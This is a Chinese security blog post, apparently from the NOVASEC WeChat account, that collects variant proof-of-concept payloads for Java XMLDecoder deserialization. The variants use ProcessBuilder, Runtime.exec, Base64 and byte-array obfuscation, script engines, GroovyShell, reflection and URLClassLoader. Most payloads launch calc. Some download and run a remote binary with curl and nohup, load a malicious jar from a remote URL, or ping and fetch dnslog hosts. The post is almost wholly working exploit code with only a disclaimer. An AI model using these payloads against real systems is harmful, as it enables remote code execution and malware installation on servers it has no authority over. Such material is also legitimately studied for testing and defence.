#  Java XMLDecode反序列化POC变形   
原创 酒零  NOVASEC   2025-04-09 22:01  
  
![](https://mmbiz.qpic.cn/mmbiz_png/toroKEibicmZDxicuqPkFfjdG2kcyzCXrXf0zrlDGZOnCofnEffxJaK5EDWfvZprrvHVAGSxiaSeXibS6GerhEAsLjw/640?wx_fmt=png "")  
  
  
**△△△点击上方“蓝字”关注我****们了解更多精彩**  
  
  
  
  
  
**0x00 前言**  
  
****  
**免责声明：继续阅读文章视为您已同意[****NOVASEC免责声明****].**  
  
  
  
记录一些  
简单的  
Java XMLDecode反序列化POC变形  
  
  
1  
  
**0x01 ProcessBuilder执行**  
  
```
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0" class="java.beans.XMLDecoder">
<object class="java.lang.ProcessBuilder">
 <array class="java.lang.String" length="1">
   <void index="0"><string>calc</string></void>
 </array>
 <void method="start"></void>
</object>
</java>
```  
  
```
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0" class="java.beans.XMLDecoder">
<object class="java.lang.ProcessBuilder">
 <array class="java.lang.String" length="1">
   <void index="0"><string>curl http://www.dddd.com:7777/as -O && chmod +x as && nohup ./as &</string></void>
 </array>
 <void method="start"></void>
</object>
</java>
```  
  
  
```
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0" class="java.beans.XMLDecoder">
<object class="java.lang.ProcessBuilder">
 <array class="java.lang.String" length="1">
   <void index="0"><string>ping -c 1 -n 1 xxxxx.dnslog.cn</string></void>
 </array>
 <void method="start"></void>
</object>
</java>
```  
  
```
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0" class="java.beans.XMLDecoder">
<object class="java.lang.ProcessBuilder">
 <array class="java.lang.String" length="3">
   <void index="0"><string>powershell</string></void>
   <void index="1"><string>-Command</string></void>
   <void index="2"><string>calc</string></void>
 </array>
 <void method="start"></void>
</object>
</java>
```  
  
  
1  
  
**0x02 Runtime执行**  
```
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0" class="java.beans.XMLDecoder">
  <object class="java.lang.Runtime" method="getRuntime">
    <void method="exec">
      <array class="java.lang.String" length="3">
        <void index="0">
          <string>powershell</string>
        </void>
        <void index="1">
          <string>-Command</string>
        </void>
        <void index="2">
          <string>Start-Process calc.exe</string>
        </void>
      </array>
    </void>
  </object>
</java>
```  
  
```
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_202" class="java.beans.XMLDecoder">
  <object class="java.lang.Runtime" method="getRuntime">
    <void method="exec">
      <array class="java.lang.String" length="1">
        <void index="0">
          <string>calc</string>
        </void>
      </array>
    </void>
  </object>
</java>
```  
  
```
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_202" class="java.beans.XMLDecoder">
  <object class="java.lang.Runtime" method="getRuntime">
    <void method="exec">
      <array class="java.lang.String" length="1">
        <void index="0">
          <string>curl http://www.dddd.com:7777/as -O && chmod +x as && nohup ./as &</string>
        </void>
      </array>
    </void>
  </object>
</java>
```  
  
```
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_202" class="java.beans.XMLDecoder">
  <object class="java.lang.Runtime" method="getRuntime">
    <void method="exec">
      <array class="java.lang.String" length="1">
        <void index="0">
          <string>wget http://xxxxx.dnslog.cn</string>
        </void>
      </array>
    </void>
  </object>
</java>
```  
  
  
1  
  
**0x03 Base64编码**  
```
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0" class="java.beans.XMLDecoder">
  <object class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
      <!-- 调用 base64 解码命令 -->
      <void index="0"><string>/bin/sh</string></void>
      <void index="1"><string>-c</string></void>
      <void index="2"><string>echo Y2FsYwo= | base64 -d | cmd</string></void>
    </array>
    <void method="start"></void>
  </object>
</java>
```  
  
```
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0" class="java.beans.XMLDecoder">
<object class="java.lang.ProcessBuilder">
 <array class="java.lang.String" length="3">
   <void index="0"><string>powershell</string></void>
   <void index="1"><string>-Command</string></void>
   <void index="2"><string>"Start-Process [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Y2FsYwo='))"</string></void>
 </array>
 <void method="start"></void>
</object>
</java>
```  
  
```
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0" class="java.beans.XMLDecoder">
  <object class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
      <!-- 调用 PowerShell -->
      <void index="0">
        <string>powershell</string>
      </void>
      <!-- 使用 -Command 参数执行命令 -->
      <void index="1">
        <string>-Command</string>
      </void>
      <!-- 解码 Base64 并启动 calc -->
      <void index="2">
        <string>Start-Process -FilePath ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcV2luZG93c1xTeXN0ZW0zMlxjYWxjLmV4ZQ==')))</string>
      </void>
    </array>
    <!-- 启动进程 -->
    <void method="start"/>
  </object>
</java>
```  
  
```
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0" class="java.beans.XMLDecoder">
  <object class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
      <!-- 调用 PowerShell -->
      <void index="0">
        <string>powershell</string>
      </void>
      <!-- 使用 -Command 参数执行命令 -->
      <void index="1">
        <string>-Command</string>
      </void>
      <!-- 解码 Base64 并启动 calc -->
      <void index="2">
        <string>Start-Process -FilePath ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcV2luZG93c1xTeXN0ZW0zMlxjYWxjLmV4ZQ==')))</string>
      </void>
    </array>
    <!-- 启动进程 -->
    <void method="start"/>
  </object>
</java>
```  
  
```
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0" class="java.beans.XMLDecoder">
  <object class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
      <void index="0">
        <string>/bin/bash</string>
      </void>
      <void index="1">
        <string>-c</string>
      </void>
      <void index="2">
        <string>echo Y2FsYwo= | base64 -d | bash</string>
      </void>
    </array>
    <void method="start"/>
  </object>
</java>
```  
  
```
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_202" class="java.beans.XMLDecoder">
  <!-- 创建一个 ProcessBuilder 对象 -->
  <object class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="1">
      <void index="0">
        <!-- 将 Base64 字符串解码为字节数组，并转换为字符串 -->
        <object class="java.lang.String">
          <array class="byte">
            <!-- 调用 Base64 解码器 -->
            <void method="decode">
              <object class="java.util.Base64" method="getDecoder"/>
              <string>Y2FsYw==</string> <!-- Base64 编码的 "calc" -->
            </void>
          </array>
        </object>
      </void>
    </array>
    <!-- 启动进程 -->
    <void method="start"/>
  </object>
</java>
```  
  
  
1  
  
**0x04 Byte编码**  
  
****```
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_202" class="java.beans.XMLDecoder">
  <object class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="1">
      <!-- 使用字节数组表示字符串 "calc" -->
      <void index="0">
        <string><object class="java.lang.String"><array class="byte" length="4">
          <void index="0"><byte>99</byte></void> <!-- c -->
          <void index="1"><byte>97</byte></void> <!-- a -->
          <void index="2"><byte>108</byte></void> <!-- l -->
          <void index="3"><byte>99</byte></void> <!-- c -->
        </array></object></string>
      </void>
    </array>
    <void method="start"></void>
  </object>
</java>
```  
  
  
  
1  
  
**0x05 ScriptEngineManager**  
  
****```
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_202" class="java.beans.XMLDecoder">
  <object class="javax.script.ScriptEngineManager" method="newInstance">
    <void method="getEngineByName">
      <string>JavaScript</string>
      <void method="eval">
        <string>java.lang.Runtime.getRuntime().exec("calc")</string>
      </void>
    </void>
  </object>
</java>
```  
  
  
1  
**0x06 GroovyShell**```
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_202" class="java.beans.XMLDecoder">
  <object class="groovy.lang.GroovyShell">
    <void method="evaluate">
      <string>Runtime.getRuntime().exec("calc")</string>
    </void>
  </object>
</java>
```  
  
  
1  
  
**0x07 Thread执行**  
```
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_202" class="java.beans.XMLDecoder">
  <object class="java.lang.Thread">
    <void method="start">
      <object class="java.lang.Runnable">
        <void method="run">
          <object class="java.lang.Runtime" method="getRuntime">
            <void method="exec">
              <array class="java.lang.String" length="1">
                <void index="0">
                  <string>calc</string>
                </void>
              </array>
            </void>
          </object>
        </void>
      </object>
    </void>
  </object>
</java>
```  
  
  
1  
  
**0x08 URLClassLoader**  
```
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_202" class="java.beans.XMLDecoder">
  <object class="java.net.URLClassLoader">
    <array class="java.net.URL" length="1">
      <void index="0">
        <object class="java.net.URL">
          <string>http://example.com/malicious.jar</string>
        </object>
      </void>
    </array>
    <void method="loadClass">
      <string>MaliciousClass</string>
      <void method="newInstance"/>
    </void>
  </object>
</java>
```  
  
```
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_202" class="java.beans.XMLDecoder">
  <object class="java.net.URLClassLoader">
    <array class="java.net.URL" length="1">
      <void index="0">
        <!-- 本地文件路径，指向 MaliciousClass.class 所在的目录 -->
        <object class="java.net.URL">
          <string>file:///C:/XXX/</string>
        </object>
      </void>
    </array>
    <void method="loadClass">
      <string>MaliciousClass</string>
      <void method="newInstance"/>
    </void>
  </object>
</java>
```  
  
  
1  
  
**0x09 反射执行**  
```
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_202" class="java.beans.XMLDecoder">
  <object class="java.lang.Class" method="forName">
    <string>java.lang.Runtime</string>
    <void method="getMethod">
      <string>exec</string>
      <array class="java.lang.Class" length="1">
        <void index="0">
          <object class="java.lang.Class" method="forName">
            <string>java.lang.String</string>
          </object>
        </void>
      </array>
      <void method="invoke">
        <object class="java.lang.Runtime" method="getRuntime"/>
        <array class="java.lang.Object" length="1">
          <void index="0">
            <string>calc</string>
          </void>
        </array>
      </void>
    </void>
  </object>
</java>
```  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/icZfUh6Tsbv0xAFjs5qQlsFCCmymOS3Vq8v6OSKDP0pw3aoCD4OTqojr5NMysBOcoMehddw6JUqYXVuurThNLsQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
  
  
END  
  
  
  
如您有任何  
投稿、  
问题  
、需求、建议  
  
请  
NOVASEC  
公众号  
后台  
留言  
！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/toroKEibicmZCP3AeicSCQAYIOvxVDSRUxpiadmBKZ8gtggx02BmG1WwCqoM23l72qV8AiabXSRKjGmk8S1HS1nTjXw/640?wx_fmt=png "")  
  
或添  
加 NOVASEC   
联系人  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/toroKEibicmZD7m4f7uBkNfCG8BjypNEukN0Ht6Ha0XsryrmS5PAmaVeyzb3JzsH5ibx6DmpHq9e8agwMkccrwNSQ/640?wx_fmt=jpeg "微信图片_20201214143605.jpg")  
  
  
感谢您对我们的支持、点赞和关注  
  
加入我们与萌新一起成长吧！  
  
  
**本团队任何技术及文件仅用于学习分享，请勿用于任何违法活动，感谢大家的支持！！**  
  
  
  
  
  
